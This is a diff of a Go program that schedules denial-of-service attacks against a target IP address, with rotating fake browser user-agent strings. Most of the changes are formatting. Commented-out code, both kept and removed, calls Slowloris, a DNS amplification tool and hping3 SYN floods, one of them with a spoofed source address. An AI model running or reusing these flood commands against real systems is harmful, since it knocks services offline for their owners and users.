@@ -7,11 +7,13 @@ import (
 	"math/rand"
 	"net/http"
 	"os/exec"
+
 	//"strings"
-	"sync"
 	"net"
 	"os"
+	"sync"
 	"time"
+
 	"github.com/jasonlvhit/gocron"
 )
 
@@ -26,7 +28,6 @@ var choice = []string{
 	"User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n",
 	"User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\r\n",
 }
-
 
 type AttackInfo struct {
 	Ip     string
@@ -81,36 +82,29 @@ func cronAttackDDoS(ip string, date string, dateNs int64) {
 func attackDDoS(ip string) {
 	//x := randomNumber()
 	//fmt.Println(x)
-	
-	_,err := exec.Command("/bin/ping", "-c1", ip).Output()
+
+	_, err := exec.Command("/bin/ping", "-c1", ip).Output()
 	if err != nil {
 		log.Fatal(err)
 	}
 	//fmt.Println(string(out))
 	/*
-	switch x {
-	case 1:
-		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		out, err := exec.Command("./slowloris", ip).Output()
-		if err != nil {
-			log.Fatal(err)
+		switch x {
+		case 1:
+			fmt.Println("------------------------Starting Slowloris Attack------------------------")
+			out, err := exec.Command("./slowloris", ip).Output()
+			if err != nil {
+				log.Fatal(err)
+			}
+			fmt.Println(string(out))
+		case 2:
+			fmt.Println("------------------------Starting TCP SYN Attack------------------------")
+			out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood").Output()
+			if err != nil {
+				log.Fatal(err)
+			}
+			fmt.Println(string(out))
 		}
-		fmt.Println(string(out))
-	case 2:
-		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	case 3:
-		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
-		out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	}
 	*/
 }
 
@@ -172,4 +166,3 @@ func randomNumber() int {
 	max := 15
 	return rand.Intn(max-min+1) + min
 }
-
